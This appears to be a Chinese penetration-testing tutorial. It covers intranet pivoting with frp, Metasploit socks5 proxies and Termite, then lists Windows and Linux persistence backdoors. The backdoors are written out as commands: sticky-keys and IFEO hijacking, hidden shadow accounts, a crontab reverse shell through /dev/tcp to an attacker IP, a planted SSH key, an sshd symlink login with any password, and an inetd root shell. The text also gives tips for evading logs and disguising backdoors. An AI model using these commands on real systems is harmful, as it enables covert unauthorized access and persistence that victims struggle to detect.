如果非要用reverse的连接方式呢，今天我皮痒，或者有防火墙只能出。  
很简单，用到端口转发。如果将边界机监听reverse的端口转发到本地端口，二层内网机reverse到边界机的端口就相当于直接和本地通信
lcx被检测概率太大，用 **frp**
#### 二层内网渗透(frp工具reverse)
关于frp要分清楚客户端和服务端到底应该放在哪。具体可以看==frpc.ini==和==frps.ini==
比如某frpc.ini的内容
    [common]
    server_addr=172.16.12.2
    server_port=7100
    [ssh]
    type=tcp
    local_ip=127.0.0.1
    local_port=5000
    remote_port=5000
如上，客户端连接服务端的7000端口，是将本机的5000端口数据以tcp转发到172.16.12.2的5000端口。因为你开frp也需要端口的嘛。这样连接服务端的5000端口就相当于连接客户端的5000端口。  
服务端只有两行，监听一下就行了
    [common]
    bind_port=7100
这里，我要强调本文的精华
#### ==frp端口转发与内网穿透==
**还是这张图。对于外网kali访问内网机，有两种手法，一是把外网kali的端口转发至边界机的端口。这样数据发到边界机的该端口就相当于发到外网kali，而端口转发frps在边界机、frpc在外网kali。另一种方式是内网穿透，把内网流量直接穿透到外网使得内网机能上网，frps也在边界机，frpc在内网机。**
可以理解为都是端口转发， **访问frps所在主机就相当于访问frpc** ，所以 **frps一定要在中间的机器上**
。逻辑理不通建议反复读来回读读通读透。有很多文章啊就不介绍端口转发和内网穿透有什么区别，整半天都不知道frps放哪，虽然只学内网穿透就够外网打内网一招鲜了。
上传frp和ini文件，运行。重新msfvenome生成一个reverse木马，lhost指向边界机
lport也是边界机要开的端口。(木马的lhost指的是需要连接的ip,不是指上传的ip)  
上传木马到二层边界机运行，再在边界机shell里开监听(监听msf木马lport)
## 二层代理
  * msf开二层代理，在刚在监听的shell里`use auxiliary/server/socks5`，然后`run`运行
  * 对之前arp扫描的主机`use auxiliary/scanner/portscan/tcp`扫描端口，设置rhost参数，准备再往里打
  * 配置浏览器代理，选socks5，端口和socks5脚本show options的端口一致
  * 访问三层内网机的80端口，准备三层内网渗透(打80端口)
二层渗透就搞定了。如果三层内网要出网经过二层内网。用bind的话还好，用reverse就需要用两次代理转发
简单提一下 **三层内网**
，可以上传lcx再进行一次端口转发，把二层内网机的frp端口转发到边界机，或者走frp代理。这样都是frp端口就串起来了，再把三层内网机reverse到二层的端口等于二层转发的端口，相当于直接reverse出去
所以！多层代理就是把多层主机端口串起来！
什么？拿完shell，几台机子的shell来回切你嫌麻烦？可以直接用Termite工具
# Termite
Termite用于管理多层跳板，有admin和agent两个文件。
  * 在第一个节点上传agent的对应版本，运行`./agent_版本 -l 端口`
  * 在攻击机运行`admin的对应版本 -c 边界机ip -p 端口`，连接没问题就跳ok
  * admin的shell里`goto 1`进入第一个节点，`shell 端口`。然后起个终端开nc或者其他监听，监听该端口，弹回了第一个shell
  * 二层机器`agent对应版本 -c 上一层ip -p 上一层端口`。端口与前面开agent和admin的端口一致。
小站权限维持大部分还是靠webshell后门，其他的可以，但没必要。还有搞站最好别在晚上搞，晚上流量少，搞站日志记录和流量占比很大。因而写的好的木马流量控制做的很好，上传和下载速度都有控制
# 权限维持
权限维持不一定是高权限。后门最好都要伪装，如启动，图标，名字。经过学习个人认为权限维持=隐藏后门
## windows后门
常见的后门：shift后门，启动项/计划任务，映像劫持，影子账户，远控  
大多数情况下，后门是一个隐藏进程。
  * shift后门
> windows按五下shift后，windows就运行了system32下的sethc.exe，启动粘滞键。
>
>>
将cmd.exe更名为sethc.exe并把原来的替换，之后连续按下5次shift后就会以system权限运行cmd.exe，之后只要利用cmd增加一个administator就可以登录
除此之外，连接上3389之后可以使用的功能不止shift，还有放大镜等可以替换。
  * 映像劫持  
现在很难使用了，在高版本的windows版本中替换的文件受到了系统保护，所以要映像劫持。  
a.exe实际打开是b.exe，就是劫持
> 映像劫持也称IFEO，是为一些在默认系统环境中运行时可能引发错误的程序执行提供特殊的环境设定。默认管理员有权读写
>
>> 映像劫持的制作过程
>>
>>   1. 在注册表中新建一个项  
>  注册表位置`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image
> File Execution Options`
>>   2. 程序中添加debugger键
>>   3. 键值设置为恶意程序的路径
>>
  * 计划任务后门  
计划任务在win7及之前版本的操作系统中使用at命令，win8及之后使用schtasks命令
> 创建计划任务基本命令: `schtask /create /t "chrom" /tr cmd.exe /sc minute /mo 1`  
>  上述命令的意思为创建一个计划任务名字为chrom，执行cmd.exe每分钟执行一次。执行后门就改指向文件和执行频率
  * 注册表自启动后门
> 制作过程
>
>>   1.
打开注册表`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run`
>>   2. 添加键值REG_SZ
>>   3. 数据中填运行程序路径
>>
  * 影子账户(杀毒能杀)  
顾名思义隐藏账户，只能通过注册表查看该用户。影子账户可以获得管理员权限且不易被发现
> 制作过程
>
>>   1. 创建隐藏账户  
>  创建隐藏账户只需在账户名后加\$符号，如`net user test$ 123 /add`
>>   2. 修改并导出注册表
>>
>>
>>>   *
注册表位置`HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/`，如进入SAM无法看到子选项，需要给administrators完全控制权限
>>>   * 将administrator用户的F值复制到test\$对应F值，保存
>>>   * 将test\$和users右键导出
>>>
>>
>>   1. 删除创建的隐藏用户  
>  cmd删除test\$`net user test$ /del`
>>   2. 导入注册表  
>  双击导出的两个注册表
>>
影子账户试了一下，还是很牛逼的。
## linux后门
  * 计划任务后门(crontab后门)
> crontab命令介绍  
>
> 
>
>   * crontab命令用来管理用户需要周期执行的任务。等于windows计划任务。crond进程每分钟会定期检查是否有要执行的任务，如果有则自动执行  
>  通常在计划任务中添加后门，或者替换服务进程，以及反弹shell
>
>   * 反弹shell
>
>
>
>>   1. 攻击机监听`nc -lvvp 本地端口号`、
>>   2. 目标机中设置计划任务`crontab -e`  
>  下列代码表示每分钟反弹一次shell到攻击机  
>  `*/1 * * * * bash -i >& /dev/tcp/攻击机外网ip/攻击机端口 0>&1`
>>
  * ssh公钥免密(常用)  
将客户端生成的ssh公钥写道目标服务器的 ~/.ssh/authorized_keys中，之后客户端利用私钥完成认证即可登录。该后门易被发现
> 制作过程
>
>>   1. 在攻击机上生成公钥私钥对  
>  `ssh-keygen -t rsa`
>>
>>
>>> 在中途会让输入密钥对密码，如果需要免密登录则回车跳过
>>
>>   1. 将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的`/root/.ssh/authorized_key`文件里  
>  `scp ~/.ssh/id_rsa.pub root@目标服务器IP地址:/root/.ssh/authorized_keys`  
>
> 
>>
>>   2. 在目标服务器中，将authorized_keys权限改为600  
>  `chmod 600 /root/.ssh/authorized.keys`
>>
>>   3. 尝试免密登录
>>
详情请见ssh登录详解
  * ssh软连接后门  
非常经典的后门，直接对sshd建立软连接，之后就能用任意密码登录
> 软连接后门的原理是利用了 **PAM配置** 文件的作用，将sshd文件软连接名称设置为su，这样应用在 **启动**
> 过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息，su在pam_rootok检测uid 0即认证成功，也可以使用/
> **etc/pam.d中存在** 的其他软连接名字
特点：1. 隐蔽性弱，rookit hunter这类防护脚本可以轻松扫到
  1. 本地查看端口会暴露
  2. 能绕过一些流量监控
> 制作过程
>
>>   1. 创建软连接 `ln -sf /usr/sbin/sshd /tmp/su`
>>   2. 设置监听端口。因为本地查看端口容易暴露，建议设置8080，8081伪装 `/tmp/su -o Port=8080`  
>  运行/tmp/su就等于运行/usr/sbin/sshd,连不上可以nmap扫一下,有防火墙连不上
>>
  * inetd/xinetd后门(很老很老)  
监听外部网络请求(socket)的系统守护进程  
**具体工作过程** ：当inetd收到一个外部请求后，会到配置文件中找到实际处理它的程序，在把socket交给那个程序处理
> inetd后门制作
>
>>   1. 向/etc/inetd.conf文件中加入一行:`daytime stream tcp nowait root /bin/bash bash
-i`
>>   2. 开启inet后用nc连接:`nc -lvvp 目标ip 13`
>>
还有prism后门等在服务器安装软件的，极易被发现